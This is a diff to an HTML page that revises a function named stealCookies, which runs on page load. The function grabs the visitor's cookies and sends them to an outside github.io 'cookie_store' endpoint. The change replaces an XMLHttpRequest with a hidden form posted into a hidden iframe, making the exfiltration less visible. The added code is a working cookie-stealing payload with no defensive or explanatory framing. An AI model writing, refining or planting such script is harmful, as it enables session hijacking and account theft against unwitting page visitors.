@@ -7,15 +7,25 @@
 <body>
     <script>
         function stealCookies() {
-            var cookies = document.cookie;
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open("POST", "https://db011.github.io/idk-test-maye/cookie_store", false);
-            xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xmlHttp.send('stolen_cookies=' + encodeURIComponent(cookies));
+            var form = document.createElement("form");
+            form.setAttribute("method", "POST");
+            form.setAttribute("action", "https://db011.github.io/idk-test-maye/cookie_store");
+            form.setAttribute("target", "iframe_target");
+            form.style.display = "none";
+
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", "stolen_cookies");
+            hiddenField.setAttribute("value", document.cookie);
+            form.appendChild(hiddenField);
+
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
         }
 
-        // Replace "onload" with "onmouseover" if you want the script to trigger when hovering over the page
         window.onload = stealCookies;
     </script>
+    <iframe name="iframe_target" style="display:none;"></iframe>
 </body>
 </html>
